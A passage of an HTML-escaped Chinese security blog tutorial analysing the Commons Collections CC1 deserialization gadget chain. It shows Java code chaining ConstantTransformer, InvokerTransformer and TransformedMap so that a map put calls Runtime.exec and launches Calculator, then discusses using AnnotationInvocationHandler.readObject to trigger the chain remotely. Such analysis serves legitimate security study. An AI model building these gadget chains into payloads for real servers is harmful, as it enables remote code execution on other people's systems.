&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        System.out.println(&lt;span class=&#34;string&#34;&gt;&amp;quot;Print &amp;quot;&lt;/span&gt; + msg);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;Test&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;test&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Test&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;InvokerTransformer&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;invokerTransformer&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;InvokerTransformer&lt;/span&gt;(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;// Test类中的函数名&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;string&#34;&gt;&amp;quot;print&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;// 参数类型，因为InvokerTransformer构造接收的是数组，所以这里就传递数组&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Class&lt;/span&gt;[]&amp;#123;String.class&amp;#125;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;// 参数值&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Object&lt;/span&gt;[]&amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;quot;hello&amp;quot;&lt;/span&gt;&amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;Map&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;transformedMap&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; TransformedMap.decorate(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;HashMap&lt;/span&gt;(),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  invokerTransformer,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  invokerTransformer&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// put元素，TransformedMap将触发InvokerTransformer的transform函数&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;transformedMap.put(test, test);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;打印了两次，因为&lt;code&gt;key&lt;/code&gt;一次&lt;code&gt;value&lt;/code&gt;一次。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021112503616.png&#34; alt=&#34;图片&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;ChainedTransformer&#34;&gt;&lt;a href=&#34;#ChainedTransformer&#34; class=&#34;headerlink&#34; title=&#34;ChainedTransformer&#34;&gt;&lt;/a&gt;ChainedTransformer&lt;/h2&gt;&lt;p&gt;ChainedTransformer也是实现了Transformer接⼝的⼀个类，它的作⽤是将内部的多个Transformer串在⼀起。&lt;/p&gt;
&lt;p&gt;通俗来说就是前⼀个Transformer执行的返回结果，作为后⼀个Transformer的参数传⼊。&lt;/p&gt;
&lt;p&gt;同样我们来看一下它的&lt;code&gt;transform()&lt;/code&gt;函数&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; Object &lt;span class=&#34;title function_&#34;&gt;transform&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(Object object)&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; i &amp;lt; iTransformers.length; i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// 循环遍历这个数组，调用元素的transform函数，并将object作为参数传入。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    object = iTransformers[i].transform(object);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; object;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;那么我们再来看一下iTransformers是哪来的，在ChainedTransformer的构造函数里直接就接收了一个&lt;code&gt;Transformer数组&lt;/code&gt;，然后赋值给&lt;code&gt;iTransformer&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021112527192.png&#34; alt=&#34;图片&#34;&gt;&lt;/p&gt;
&lt;p&gt;来定义两个Transformer接口的实现类，并通过ChainedTransformer将它们串起来&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Transformer1&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;implements&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Transformer&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;meta&#34;&gt;@Override&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; Object &lt;span class=&#34;title function_&#34;&gt;transform&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(Object input)&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Transformer1&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Transformer2&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;implements&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Transformer&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;meta&#34;&gt;@Override&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; Object &lt;span class=&#34;title function_&#34;&gt;transform&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(Object input)&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; input + &lt;span class=&#34;string&#34;&gt;&amp;quot;-Transformer2&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;第一个Transformer的transform函数接收到的input是最外层map在put时传入的值。&lt;/p&gt;
&lt;p&gt;第二个Transformer的transform函数的参数是第一个Transformer的transform函数的返回值。&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Transformer[] transformers = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Transformer&lt;/span&gt;[]&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Transformer1&lt;/span&gt;(),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Transformer2&lt;/span&gt;()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;ChainedTransformer&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;chainedTransformer&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;ChainedTransformer&lt;/span&gt;(transformers);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;Map&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;transformedMap&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; TransformedMap.decorate(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;HashMap&lt;/span&gt;(),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  chainedTransformer,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  chainedTransformer&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;transformedMap.put(&lt;span class=&#34;string&#34;&gt;&amp;quot;key&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;val&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// &amp;#123;Transformer1-Transformer2=Transformer1-Transformer2&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;System.out.println(outerMap);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;结果为&lt;code&gt;&amp;#123;Transformer1-Transformer2=Transformer1-Transformer2&amp;#125;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021112605383.png&#34; alt=&#34;图片&#34;&gt;&lt;/p&gt;
&lt;p&gt;从执行的结果能看出ChainedTransformer的作用，其实就是按顺序执行&lt;code&gt;Transformer#transform&lt;/code&gt;，然后已最后那个&lt;code&gt;Transformer#transform&lt;/code&gt;处理的结果为准，返回处理的结果，就像流水线一样每个环节就是一个Transformer然后拼接到一起整合成一个成品。&lt;/p&gt;
&lt;h2 id&gt;&lt;a href=&#34;#&#34; class=&#34;headerlink&#34; title&gt;&lt;/a&gt;&lt;/h2&gt;&lt;h2 id=&#34;将Transformer串起来执行&#34;&gt;&lt;a href=&#34;#将Transformer串起来执行&#34; class=&#34;headerlink&#34; title=&#34;将Transformer串起来执行&#34;&gt;&lt;/a&gt;将Transformer串起来执行&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;ConstantTransformer返回一个Runtime&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;InvokerTransformer通过反射调用上一个Transformer的返回值也就是Runtime，调用它的exec函数，弹出计算器。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;使用ChainedTransformer，存入上边2个Transformer，这样才能串起来。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;获取TransformedMap，调用put函数，触发transform回调。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;弹出计算器&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Transformer[] transformers = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Transformer&lt;/span&gt;[]&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;// ConstantTransformer构造函数传什么，在transform函数就返回什么！&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;ConstantTransformer&lt;/span&gt;(Runtime.getRuntime()),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;// 上边的ConstantTransformer返回的是一个Runtime对象，那么我们这里通过InvokerTransformer来调用Runtime的exec函数，进行命令执行。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;InvokerTransformer&lt;/span&gt;(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;string&#34;&gt;&amp;quot;exec&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Class&lt;/span&gt;[]&amp;#123;String.class&amp;#125;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Object&lt;/span&gt;[]&amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&amp;quot;&lt;/span&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// 构造一个ChainedTransformer，将上边的ConstantTransformer和InvokerTransformer串联起来执行。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;Transformer&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;chainedTransformer&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;ChainedTransformer&lt;/span&gt;(transformers);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;Map&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;transformedMap&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; TransformedMap.decorate(&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;HashMap&lt;/span&gt;(), &lt;span class=&#34;literal&#34;&gt;null&lt;/span&gt;, chainedTransformer);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;transformedMap.put(&lt;span class=&#34;string&#34;&gt;&amp;quot;test&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;test&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021112725078.png&#34; alt=&#34;图片&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;疑问&#34;&gt;&lt;a href=&#34;#疑问&#34; class=&#34;headerlink&#34; title=&#34;疑问&#34;&gt;&lt;/a&gt;疑问&lt;/h1&gt;&lt;p&gt;这里存在一个问题，想要在实战中能触发rce，将构造的Payload数据流发送过去后，目标服务端调用readObject进行反序列化还原对象，&amp;#x3D;&amp;#x3D;将TransformedMap还原后还需要进行一次put动作才能触发transform函数来达到rce效果。&amp;#x3D;&amp;#x3D;&lt;/p&gt;
&lt;p&gt;但是很遗憾目前我们构造的这些，它只是一个本地的demo，因为发送到目标服务器后它并不会主动进行一次put动作(当然也有可能代码会在readObject后调用一次put，看运气！)。&lt;/p&gt;
&lt;p&gt;那么如果我们在Java中能找到满足以下条件的类，就能进行RCE。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;类支持序列化操作&lt;/li&gt;
&lt;li&gt;重写了readObject函数，并且在readObject函数中调用了我们传入的TransformedMap，并做了put的动作来触发transform函数。&lt;/li&gt;
&lt;li&gt;同时又要确保目标服务器上也存在该类，所以最好是JavaJdk中的类。&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;AnnotationInvocationHandler&#34;&gt;&lt;a href=&#34;#AnnotationInvocationHandler&#34; class=&#34;headerlink&#34; title=&#34;AnnotationInvocationHandler&#34;&gt;&lt;/a&gt;AnnotationInvocationHandler&lt;/h1&gt;&lt;p&gt;那么在Java中有一个类&lt;code&gt;sun.reflect.annotation.AnnotationInvocationHandler&lt;/code&gt;，这个是属于Java原生库里的类，不需要额外引入依赖。&lt;/p&gt;
&lt;p&gt;来看一下这个类的readObject函数&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span 